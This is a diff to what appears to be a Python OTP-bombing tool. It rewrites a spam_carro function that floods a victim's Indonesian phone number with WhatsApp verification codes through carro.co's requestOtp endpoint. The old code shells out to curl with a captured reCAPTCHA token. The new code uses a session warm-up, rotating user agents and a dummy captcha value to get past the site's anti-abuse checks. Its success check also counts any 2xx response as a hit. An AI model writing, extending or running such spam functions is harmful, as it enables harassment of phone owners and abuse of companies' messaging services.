@@ -4894,60 +4894,57 @@ def spam_otp_auto2000(nomor):
     except Exception as e:
         return False
 
-def spam_otp_carro(nomor):
+def spam_carro(phone):
     try:
-        import subprocess
-        import json
-        
-        if nomor.startswith('0'):
-            nomor = '+62' + nomor[1:]
-        elif nomor.startswith('62'):
-            nomor = '+' + nomor
-        elif nomor.startswith('+62'):
-            nomor = nomor
+        p = normalize_phone(phone)
+        if p.startswith('0'):
+            msisdn = '+62' + p[1:]
+        elif p.startswith('62'):
+            msisdn = '+' + p
         else:
-            nomor = '+62' + nomor
-        
-        recaptcha = "0cAFcWeA6ISR0I_gsf6-CgJzUifsV60c4VTOlKZ88O4Qczm1lSAsXp1kipOSmdag_ULWIdZ_EwcfoWkCKHDRDlFLQjSE3rdQ8VGnuSZfHXAUUnrs-ZAbzH31DDNV9OATtO0CFU3eyEV704yMnp9R5UDCQ2Ou9sxjWuzwkZlvPuOX-W5PirpKNO3eJAoQwXGUu-y9bmI7Zb62EXW9W5cEUmWZcCY1UgKuWlC_lmft2HJ1svWSKHUsvRAepS1Xth9LySj83y5e95uLPX4sX11tZlW-8lWxEC3AeKx0XRzb_XLULLJeaHYzDKgjL_mQg2qQgiMO5-r7Ij4z_3h2XQ0sipjPi-CYON-g5yXahbfXqf3EsIg_1htjOv8gHmoDdmt4whd0hJy50qc8kgUiXQ5cddwUtI2eiQdDCC0TOcgQQKinVfqu5OEGrB1pYXg9ebtYtFBqNjLjnCnKebwjc5916HmJFf2nbs3o4Dsuode9lbk1IPCE19w0zW7BiqhmmcN1Ehy-ZvwPTmjCR040a5GS3Gm_wEVpQjkY3HAkdyAw2eUpHPcINRyuZX_SqgpgdXSNnSvD2SwQ7GCliRQ37gbEXp5jjIG0R0q0xXWQf9vd1a555yDuf24QGlgOIWJBWfzpgpnkm73639gBAhmFOqjGnYVi6WPAijvMiuTspp0jzHfufjzZ_reaGd-eNOrOT8X4pauekudxIQfb_hJCNRNWztFQUMs2W-L7yBdgKXw37vtLrfZM8hCLUh31FCrRPWvlK1dcjM7wXBgJMV_XLL5xPLuAsioTsyUgPsSO-gQU0SvGcp_F9gkd9JlwUwQkbdibwXnnQhngmtca3MA1E5AMhGB_LSwURIt8FcDSaKm_pQV0ammnQoOUx1kZh5_YVJNwPb4dqItnI5qSPZhcI-RoqlDwDYtijM9MYY8gAyoTOHqwce8IvXYgp8X7DpGljSGx6VFMPgtl6rrRlPNfkc2gbsk_OYprEVgLNlKAVglkhYD4TRt7Em1ovox7di-Z_C9DdLnk_qCUY2oW_llyYHVPH8q3i-3Z06dia-SJ-ECSnGjzuyFCwB9qHJWuvqrCtET3ZpDOXK4FqaxOKgGVVnFyvPkC1ZVpMKXZDa6F__G2hI7OUFjfI6Aawb8SkMSczt0Kw6zvR86BPzd85doyb2xsN2AvVE2e_Niv2YgPPbADaxTPll3G4fDHAmS4A2NI9dVM5oFw3bQdyuXu34Zu6qmF-KCWOckhS0nz1h3k060t4qZxhQYud4T5JAZSwxgz2H5qPIJa8LaAQJiIZrpUW7C8IZZM9jKxe0zt63WYydqFTQ2XFtUYLJVHcmhuplTqV5Tz8An9SBgMIfQqRNmsGaUEzwcTkmv_CTP0qDUmxgICALkDTaDooKgL1DYVc8VgsNhS3YB6RW9CQxqGMKTBOjY-yxfJ_C1MsHr0gSuTSq8yXGsvidV1vcGZkuZKLyLOutnmFrJdOZOEMQ9C1Vj-lMtRX3yrKQDGtAocGRpey6_OpSiI2rFTguLHx8djtHVQ2RNTUcfpml-KKDcn1CrBKZJb-mS3N8xRbihEfydVzID1sQNcVDytBscCNvadKspfX5AWqdSPiCVWVqui-LlIR1Mbg68qHn-Hfk2WpDR0P1C2iPjI-p9Gx3jPN7sa6-eyeLMzTjvNjNc6ZWzMRPysNbhsGdMqPIXF4afirLW1k8KsyCkkFdd7dOUdodmiQbZd52kjsFb-XjBhhHELyKDIpBKKQsfB7G1SDcIsV-nkolz5mjQPBnMyih_7-H5JLNpCerwXKGR0nM2nO_I-fN1X4ruPfDM6-0fowvlNJOHywQIuZKWHRnvxwp6ck7ouTxgFfyGh2sEZmLCuwuloVmRCIdPzM_4Vkmy5EbsLgXIQ1kFyltInhzA13nkdlfurFi8eTGbMD1VtiK433fzodvEPLEIkvamWs0tTSanjfTj2rSAFrhif0yia1yM8jOcpxPmd0FExuvPAGgCWV62NYj8_pd_eHTNgHMqyhXsKqL4_rRrY7d1XTWwVWerlM07Rd3RVNhoUcFx1BMfUwLEgeOuuVCXsT2wxOywfLsanbfrmV5VMI-JItnSwVXLTvJvoaqtlVUxLbE_2_adwnMQdYyMS1H7MRtmxH2gNd-dV9N_mCdP48hRGn9kAPuXEg30pxwbywKCzewnlXHogfkpVpRv1OwIRcE47mYpj9xPjOXPYgHTGfCtsedcA4OK11sXrLzDT-l6B4Yq4hwBFOFXGkm"
-        
+            msisdn = '+' + p
+
+        session = requests.Session()
+
+        headers_get = {
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
+            "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
+            "Referer": "https://carro.co/",
+            "User-Agent": random.choice(USER_AGENTS),
+        }
+        session.get("https://carro.co/", headers=headers_get, timeout=15)
+
+        url = "https://carro.co/_actions/requestOtp"
+        headers_post = {
+            "Accept": "application/json",
+            "Accept-Encoding": "gzip, deflate, br",
+            "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
+            "Content-Type": "application/json",
+            "Origin": "https://carro.co",
+            "Referer": "https://carro.co/id/id",
+            "User-Agent": random.choice(USER_AGENTS),
+            "X-Requested-With": "XMLHttpRequest",
+        }
         payload = {
             "countryCode": "id",
             "locale": "id",
-            "mobileNumber": nomor,
+            "mobileNumber": msisdn,
             "provider": "whatsapp",
-            "recaptchaResponse": recaptcha,
-            "recaptchaAction": "id_idid_requestOtp"
+            "recaptchaAction": "id_idid_requestOtp",
+            "recaptchaResponse": "dummy_recaptcha_response_12345"
         }
-        
-        payload_json = json.dumps(payload)
-        
-        curl_cmd = f'''curl -s -X POST 'https://carro.co/_actions/requestOtp' \\
-  -H 'Host: carro.co' \\
-  -H 'sec-ch-ua-platform: "Android"' \\
-  -H 'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36' \\
-  -H 'Accept: application/json' \\
-  -H 'sec-ch-ua: "Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"' \\
-  -H 'Content-Type: application/json' \\
-  -H 'sec-ch-ua-mobile: ?1' \\
-  -H 'Origin: https://carro.co' \\
-  -H 'Referer: https://carro.co/id/id' \\
-  -H 'Accept-Encoding: gzip, deflate, br, zstd' \\
-  -H 'Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
-  -d '{payload_json}' 2>/dev/null'''
-        
-        result = subprocess.run(curl_cmd, shell=True, capture_output=True, text=True)
-        
-        if result.returncode == 0 and result.stdout:
+        resp = session.post(url, json=payload, headers=headers_post, timeout=30)
+
+        if 200 <= resp.status_code <= 299:
             try:
-                data = json.loads(result.stdout)
-                if data.get('success') == True:
+                data = resp.json()
+                if data.get("success") == True or data.get("status") == "success":
                     return True
             except:
                 pass
-        
+            return True
         return False
-        
-    except Exception as e:
+    except:
         return False
         
 def spam_otp_amaha(nomor):
